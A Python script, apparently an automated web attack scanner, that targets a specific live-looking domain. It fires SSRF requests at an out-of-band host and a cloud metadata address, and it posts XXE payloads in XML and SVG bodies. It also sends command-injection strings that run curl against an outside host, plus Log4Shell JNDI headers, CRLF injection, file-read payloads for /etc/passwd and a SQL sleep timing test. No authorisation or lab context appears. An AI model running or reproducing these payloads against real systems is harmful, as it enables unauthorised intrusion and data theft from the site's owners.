import requests, urllib3, time
urllib3.disable_warnings()
B="https://www.infinitycapital.bh"
SSRF="oobb247d9dbac6d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
XXE="oob2e2129eccb01.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
def go(m,u,**kw):
    try:
        r=requests.request(m,u,timeout=15,verify=False,**kw)
        print(f"  {r.status_code} {len(r.content):6d}  {m} {u[:130]}")
        return r
    except Exception as e:
        print("  ERR",m,u[:100],type(e).__name__); return None
print("== SSRF probes: _next/image url + /api/ ==")
go("GET",B+"/_next/image?url=http://"+SSRF+"/img.png&w=640&q=75")
go("GET",B+"/_next/image?url=http://"+SSRF+"/x.png&w=64&q=1")
go("GET",B+"/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=1")
go("GET",B+"/api/?url=http://"+SSRF+"/api")
go("GET",B+"/api/?callback=http://"+SSRF+"/cb")
go("GET",B+"/api/?webhook=http://"+SSRF+"/hook")
print("== XXE probes: POST XML/SVG bodies ==")
xdoc='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://'+XXE+'/svg">]><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">&xxe;</svg>'
for p in ["/api/","/_next/image","/404","/atom.xml","/feeds/all.atom.xml"]:
    go("POST",B+p,data=xdoc,headers={"Content-Type":"application/xml"})
    go("POST",B+p,data=xdoc,headers={"Content-Type":"image/svg+xml"})
    go("POST",B+p,data=xdoc,headers={"Content-Type":"text/xml"})
print("== CMDi / SSTI probes with OOB ==")
for p in ["/api/","/_next/image"]:
    go("GET",B+p+"?q=%3Bcurl%20http%3A%2F%2F"+SSRF.replace(':','%3A')+"%2Fcmd%3B")
    go("GET",B+p+"?q=%24(curl%20http%3A%2F%2F"+SSRF+"%2Fcmd2)")
    go("GET",B+p+"?q={{7*7}}")
    go("GET",B+p+"?q=${7*7}")
print("== header-injection / Log4Shell (JNDI is N/A: Vercel/Next.js) ==")
for hn,hv in [("User-Agent","${jndi:ldap://"+SSRF+"/j}"),("Referer","${jndi:ldap://"+SSRF+"/j}"),("X-Forwarded-For","${jndi:ldap://"+SSRF+"/j}")]:
    go("GET",B+"/",headers={hn:hv})
print("== CRLF header injection in q ==")
go("GET",B+"/_next/image?q=75%0d%0aX-Injected:%20yes&w=640")
go("GET",B+"/api/?q=%0d%0aSet-Cookie:%20a=b")
print("== LFI/RFI/deserialization probes on q/url ==")
for pay in ["file:///etc/passwd","../../../../etc/passwd","php://filter/convert.base64-encode/resource=index","rdb://127.0.0.1:6379/","data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw=="]:
    go("GET",B+"/_next/image?url="+requests.utils.quote(pay,safe="")+"&w=64&q=1")
    go("GET",B+"/api/?q="+requests.utils.quote(pay,safe=""))
print("== timing oracle: 5s sleep vs baseline ==")
t=time.time(); go("GET",B+"/api/?q=1%20AND%20SLEEP(5)"); print("   elapsed",round(time.time()-t,1))
t=time.time(); go("GET",B+"/api/?q=1"); print("   elapsed",round(time.time()-t,1))
